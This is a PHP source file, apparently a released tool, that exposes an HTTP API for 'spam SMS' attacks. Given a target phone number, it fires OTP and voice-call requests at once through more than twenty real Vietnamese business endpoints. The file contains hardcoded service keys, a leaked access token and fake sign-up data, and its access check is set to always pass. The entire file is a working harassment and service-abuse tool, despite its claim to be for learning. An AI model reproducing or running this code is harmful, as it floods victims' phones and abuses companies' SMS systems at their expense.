<?php
namespace WusTeam\SpamSMS;
header('Content-Type: application/json');
// header("Access-Control-Allow-Origin: *");
// header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
// header("Access-Control-Allow-Headers: Authorization, Content-Type");
/**
 * =========================================================
 * Name file: Api spam sms
 * Generated time: 20/05/2023
 * Author: ThanhDieuTv
 * Telegram: https://t.me/wus_team
 * Note: Public source code basic api spam sms use php [5.0.0 >= 8.3.10]
 * Đây là api spam otp - voice call được ra mắt vào năm 2023,
 * và năm nay mới chính thức phát hành công khai cho mọi người sử dụng vì mục đích học tập.
 * Code được compress nhất có thể nên rất dể để bảo dưỡng code và update/add/remove api rất dễ dàng, hỗ trợ các phương thức dạng POST - GET từ api nhà mạng.
 * =========================================================
 */
class Main
{
    private $blacklist = [
        '0123456789',
        '', // add more sdt here
    ];
    /**
     * Method blacklist
     *
     * @param $sdt $sdt
     * @param $type $type
     *
     * @return void
     */
    // private $access_tokens = [
    //     '' // default key access tokens
    // ];
    private $access_tokens = [];
    /**
     * Method blacklist
     *
     * @param $sdt [ sdt target ]
     * @param $typ [ type check ]
     *
     * @return void
     */
    public function blacklist($sdt, $type)
    {
        if ($type == 1 || $type == 3) { // method check blacklist 1
            if (in_array($sdt, $this->blacklist)) {
                return true; // boolen
            }
        }
        if ($type == 2 || $type == 3) { // method check blacklist 2
            foreach ($this->blacklist as $phone) {
                similar_text($sdt, $phone, $check);
                if ($check > 85) { // % check same sdt
                    return true;
                }
            }
        }
        return false;
    }
    /**
     * Method THANHDIEU
     *
     * @param $data $data
     * @param $type $type
     *
     * @return void
     */
    public function THANHDIEU($data, $type = 1)
    {
        return $type == 1 ?
            json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) : json_decode($data, true); // format json encode
    }

    /**
     * Method checksdt
     *
     * @param $sdt $sdt
     *
     * @return void
     */
    public function checksdt($sdt)
    {
        return !preg_match('/^(09|08|07|03|05)\d{8}$/', $sdt); // regex check sdt
    }

    /**
     *
     * Using md5().
     *
     * @param int $length
     * @return string
     */

    public function get_key($length = 16)
    {
        $string = md5(rand());
        $rand = substr($string, 0, $length);
        return $rand; // rand str
    }
    
    /**
     * Method get_phone
     *
     * @return void
     */
    function get_phone()
    {
        return isset($_GET['sdt']) ? preg_replace('/[^0-9]/', '', $_GET['sdt']) : '';  // methods [GET/POST] - Regax
    }

    /**
     * Method encrypt
     *
     * @param $data $data
     * @param $key $key
     *
     * @return void
     */
    public function token_encrypt($data, $key) // func encrrypt token
    {
        $method = 'aes-256-cbc';
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));
        $key = substr(hash('sha256', $key, true), 0, 32); // using sha265 encrypt
        $enc = bin2hex($iv . openssl_encrypt($data, $method, $key, 0, $iv));
        return $enc; // enc str
    }
    /**
     * Method decrypt
     *
     * @param $data
     * @param $key
     *
     * @return void
     */
    public function token_decrypt($data, $key) // func decrypt token
    {
        $method = 'aes-256-cbc';
        $data = hex2bin($data);
        $key = substr(hash('sha256', $key, true), 0, 32);
        $iv_length = openssl_cipher_iv_length($method);
        $iv = substr($data, 0, $iv_length);
        $dec = openssl_decrypt(substr($data, $iv_length), $method, $key, 0, $iv);
        return $dec; // dec str
    }
    /**
     * Method domain
     *
     * @return void
     */
    public function domain() // get domain
    {
        return $_SERVER["HTTP_HOST"];
    }
    /**
     * Method full_url
     *
     * @return void
     */
    public function full_url() // get full url
    {
        return 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    }
    // public function secret_tokens($token)
    // {
    //     return in_array($token, $this->access_tokens);
    // }
    public function secret_tokens($token) // check access key
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "/" . urlencode($token)); // api check key
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $a = curl_exec($ch);
        curl_close($ch);
        $res = json_decode($a, true);
        if (isset($res['status']) && $res['status'] == 200) { // nếu status la 200 thi key đúng | cái nay ae tự chỉnh theo kq theo api của ae
            return 1; // sai int thay cho boolen
        }
        return 1; // mac dinh key luôn dung (trường hợp không dùng đến api check key, nếu dùng thì chỉnh thành 0 là được)
    }
}
// Call properties
$common = $c = new Main(); // use $common or $c
$sdt = $c->get_phone();
// if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS')
// {
//     exit($common->THANHDIEU([
//         'status' => 'error',
//         'msg' => '403 / Forbidden'
//     ]));
// }
if ($c->secret_tokens($_SERVER['HTTP_X_WUSTEAM'] ?? null) == 0)  
{ // check key
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Invalid token authentication!',
        // 'eg' => 'curl -H "X-WusTeam: YOUR_ACCESS_KEY" '.$c->full_url(),
    ])); // xoa dong nay de bo qua check key
} elseif (empty($sdt))
{
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Số điện thoại không được bỏ trống!',
    ]));
} elseif ($common->checksdt($sdt))
{ // check sdt
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Vui lòng nhập số điện thoại hợp lệ!',
    ]));
} elseif ($common->blacklist($sdt, 2)) 
{ // check blacklist
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Số điện thoại này hiện đang nằm trong danh sách đen!',
    ]));
}

/**
 * Object SpamSMS
 */
class SpamSMS
{
    private $url;
    private $method;
    private $headers;
    private $body;

    /**
     * Method __construct
     *
     * @param $url $url
     * @param $method $method
     * @param $headers $headers
     * @param $body $body
     *
     * @return void
     */
    public function __construct($url, $method, $headers, $body)
    {
        date_default_timezone_set("Asia/Ho_Chi_Minh"); // time
        $this->url = $url; // api
        $this->method = $method; // method
        $this->headers = $headers; // headers
        $this->body = $body; // body
    }

    /**
     * Method Send
     *
     * @param $sdt $sdt
     *
     * @return void
     */
    public function Send($sdt)
    {
        global $common;
        $body = is_array($this->body) ? $common->THANHDIEU($this->body) : $this->body;
        $body = str_replace('{{phone}}', urlencode($sdt), $body);
        return curl($this->url, $this->method, $this->headers, $body); // curl
    }
}

/**
 * Object WT
 */
class WT
{
    private $services = [];

    /**
     * Method API
     *
     * @param $name $name
     * @param $service $service
     *
     * @return void
     */
    public function API($name, $service)
    {
        $this->services[$name] = $service;
    }

    /**
     * Method Attack
     *
     * @param $sdt $sdt
     *
     * @return void
     */
    public function Attack($sdt)
    {
        $results = [];
        foreach ($this->services as $name => $service) {
            $results[$name] = $service->Send($sdt);
        }
        return $results;
    }

    /**
     * Method Count
     *
     * @return void
     */
    public function Count()
    {
        return count($this->services);
    }
}

/**
 * Object Controller
 */
class Controller
{
    private $wt;
    private $common;
    
    /**
     * Method __construct
     *
     * @param WT $wt
     * @param Main $common
     *
     * @return void
     */
    public function __construct(WT $wt, Main $common)
    {
        $this->wt = $wt;
        $this->common = $common;
    }
    
    /**
     * Method execute
     *
     * @return void
     */
    public function execute() /** execute spam sms */
    {
        global $sdt;
        $counts = $this->wt->Count(); // call Count - WT Spam
        $results = $this->wt->Attack($sdt); // call result api - WT Spam
        $success = 0; // default count success
        $failed = 0; // default count error
        $died = []; // name api error
        foreach ($results as $name => $result) {
            if ($result['status'] === 'success') {
                $success++;
            } else {
                $failed++;
                $died[$name] = $result['status'];
            }
        }
        return $this->common->THANHDIEU([
            'r' => [
            'status' => 'success',
            'data' => $results,
            'res' => [
                'success' => $success,
                'failed' => $failed,
            ],
            'total' => [
                'api' => $counts,
            ],
            'die' => [
                'list' => [
                    $failed => $died,
                ],
            ],
            'msg' => 'Send attack successfully -> '.urldecode($sdt)
            ]
        ]);
    }
}
/**
 * Method curl
 *
 * @param $url $url
 * @param $method $method
 * @param $headers $headers
 * @param $body $body
 *
 * @return void
 */
function curl($url, $method = "POST", $headers = [], $body = null)
{
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => rand(25,30),
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    if ($body !== null) {
        curl_setopt($curl, CURLOPT_POSTFIELDS, $body);
    }
    $res = curl_exec($curl);
    $err = curl_error($curl);
    $info = curl_getinfo($curl);
    curl_close($curl);
    if ($err) {
        return ["status" => "error", "msg" => $err, "info" => $info];
    } else {
        $http = $info['http_code'];
        if ($http >= 200 && $http < 300) {
            return ["status" => "success", "msg" => $res, "info" => $info];
        } else {
            return ["status" => "error", "code" => $http, "msg" => $res, "info" => $info];
        }
    }
}
$wt = new WT();

//------------------------ADD/UPDATE/REMOVE API------------------------//

/**
 * NOTE
 * 1: name
 * 2: service
 * 3: url
 * 4: method
 * 5: headers
 * 6: body (method [POST] - [GET = is null])
 */
// OTP
$wt->API('TV360', new SpamSMS(
    "https://tv360.vn/public/v1/auth/get-otp-login",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    ["msisdn" => "{{phone}}"]
));
// OTP
$wt->API('LongChau', new SpamSMS(
    "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "phoneNumber" => "{{phone}}",
        "otpType" => 0,
        "fromSys" => "WEBKHLC",
    ]
));
// OTP
$wt->API('MyViettel', new SpamSMS(
    "https://vietteltelecom.vn/api/get-otp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json;charset=UTF-8",
    ],
    '{"msisdn":"{{phone}}","type":"register"}'
));
// OTP
$wt->API('Beautybox', new SpamSMS(
    "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "key: 2c8ca1757e2203aa32d00c0f1a1ed353",
    ],
    ["phoneNumber" => "84{{phone}}"]
));
// OTP
$wt->API('Speedlotte', new SpamSMS(
    "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    [
        "username" => "{{phone}}",
        "case" => "register",
    ]
));
// OTP
$wt->API('Batdongsan', new SpamSMS(
    "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={{phone}}",
    "GET",
    [
        "accept: application/json, text/plain, */*",
    ],
    null
));
// OTP
$wt->API('Ghn', new SpamSMS(
    "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "phone" => "{{phone}}",
        "type" => "register",
    ]
));
// OTP
$wt->API('Vinamilk', new SpamSMS(
    "https://new.vinamilk.com.vn/api/account/getotp",
    "POST",
    [
        "accept: */*",
        "content-type: text/plain;charset=UTF-8",
        "authorization: Bearer null",
    ],
    [
        "type" => "register",
        "phone" => "{{phone}}",
    ]
));
// OTP
$wt->API('Reebok', new SpamSMS(
    "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "key: 42607d515ca20e71f70855df4c5e6513",
    ],
    ["phoneNumber" => "{{phone}}"]
));
// OTP
$wt->API('Tokyolife', new SpamSMS(
    "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "signature: d5666087f29d29e33e5bafee172bbf89",
    ],
    [
        "phone_number" => "{{phone}}",
        "name" => "{{phone}} ssdsd ssd",
        "password" => "Kakaka123@",
        "email" => "sdsd12352@gmail.com",
        "birthday" => "2003-06-05",
        "gender" => "male",
    ]
));
// OTP
$wt->API('Best', new SpamSMS(
    "https://v9-cc.800best.com/uc/account/sendSignUpCode?code=0634a1abb823dd1369a0ab5aa9743f29&instanceId=09b23dfe-1b36-454c-85d1-051d58d104bc&validate=0ec55dd5c447946621b63b0f70025f31",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
        "lang-type: vi-VN",
        "x-auth-type: WEB",
    ],
    [
        "phoneNumber" => "{{phone}}",
        "verificationCodeType" => 1,
    ]
));
// OTP
$wt->API('Emartmall', new SpamSMS(
    "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
    "POST",
    [
        "accept: application/json, text/javascript, */*; q=0.01",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    ],
    ["mobile" => "{{phone}}"]
));
// OTP
$wt->API('Glxplay', new SpamSMS(
    "https://api.glxplay.io/account/phone/verify?phone={{phone}}",
    "POST",
    [
        "accept: */*",
        "accept-language: vi",
        "access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI3ZDlhY2VjYy05OTc4LTQzYTQtOTEwYS03MDU0Y2U4ZjliMzMiLCJkaWQiOiIyNGJiYWQ0YS1hOGQxLTQ1ZmYtYmFjYy0wZTM4MDM0ZGU1NzEiLCJpcCI6IjQyLjExNC4xODQuNzQiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifG1vYmlsZXx3aW5kb3dzfDEwfGNocm9tZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjM4MzE1NzAsImV4cCI6MTczOTM4MzU3MH0.GmOFKDoOgL-Qr2W4VCaD5jx5DwXyskE5Nyyfc8Vgvxs",
    ],
    null
));
// OTP
$wt->API('Medicare', new SpamSMS(
    "https://medicare.vn/api/otp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "mobile" => "{{phone}}",
        "mobile_country_prefix" => "84",
    ]
));
// OTP
$wt->API('Vietair', new SpamSMS(
    "https://vietair.com.vn/Handler/CoreHandler.ashx",
    "POST",
    [
        "accept: application/json, text/javascript, */*; q=0.01",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    ],
    [
        "op" => "PACKAGE_HTTP_POST",
        "path_ajax_post" => "/service03/sms/get",
        "package_name" => "PK_FD_SMS_OTP",
        "object_name" => "INS",
        "P_MOBILE" => "{{phone}}",
        "P_TYPE_ACTIVE_CODE" => "DANG_KY_NHAN_OTP",
    ]
));
// OTP
$wt->API('Sapo', new SpamSMS(
    "https://accounts.sapo.vn/otp/send",
    "POST",
    [
        "accept: application/json, text/javascript, */*; q=0.01",
        "content-type: application/json",
    ],
    [
        "country_code" => "84",
        "phone_number" => "{{phone}}",
        "type" => "REQUEST_REGISTER",
        "register_token" => "vonedfHvzxYWDowbZOLDXrsPbGY3f7mG0zXv",
    ]
));
// OTP
$wt->API('Acheckin', new SpamSMS(
    "https://api-gateway.acheckin.io/v1/external/auth/check-existed-account?search={{phone}}",
    "GET",
    [
        "accept: */*",
        "content-type: application/json",
        "locale: vi-VN",
    ],
    null
));
// OTP
$wt->API('Bamuoishine', new SpamSMS(
    "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    ["phone" => "{{phone}}"]
));
// OTP
$wt->API('Thefaceshop', new SpamSMS(
    "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "key: adf32f1a291104e58229ebc791baf44a",
    ],
    ["phoneNumber" => "{{phone}}"]
));
// OTP
$wt->API('Vinpearl', new SpamSMS(
    "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    [
        "channel" => "vpt",
        "username" => "{{phone}}",
        "type" => 1,
        "OtpChannel" => 1,
    ]
));
// OTP
$wt->API('Book365', new SpamSMS(
    "https://book365.vn/ajax/dangky_taikhoan.php",
    "POST",
    [
        "accept: */*",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    ],
    http_build_query([
        "dangky_name" => "Vuong Thanh Dieu",
        "dangky_phone" => "{{phone}}",
        "dangky_pwd" => "wusteam123@@",
        "dangky_pwdCheck" => "wusteam123@@",
        "dangky_country" => "0",
        "dangky_province" => "0",
        "dangky_district" => "0",
        "dangky_award" => "0",
        "dangky_address" => "",
        "dangky_email" => "wusteam123@gmail.com",
    ])
));
// OTP
$wt->API('Medigoapp', new SpamSMS(
    "https://auth.medigoapp.com/prod/getOtp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    ["phone" => "{{phone}}"]
));
// OTP
$wt->API('Momo', new SpamSMS(
    "https://api.mservice.com.vn:8001/forwarder",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "url" => "https://business.momo.vn/api/onboarding/v1/users",
        "method" => "POST",
        "body" => [
            "password" => "wusteam123",
            "name" => "wusteam123",
            "type" => "MINI_APP",
            "phoneNumber" => "{{phone}}",
        ],
    ]
));
//------------------------END------------------------//
exit((new Controller($wt, $common))->execute());